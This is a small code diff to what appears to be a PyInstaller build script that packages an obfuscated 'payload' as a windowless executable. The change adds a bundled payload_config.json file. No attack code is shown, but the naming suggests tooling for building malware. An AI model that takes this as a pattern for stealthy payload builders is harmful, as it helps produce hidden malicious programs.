@@ -47,6 +47,8 @@ def build():
         '--noconsole',
         f'--name={PAYLOAD_NAME}',
         f'--distpath={OUTPUT_DIR}',
+        # Ajouter le fichier de config au bundle
+        f'--add-data={os.path.join("modules", "payload_config.json")};.',
         obfuscated_script_path
     ]
     
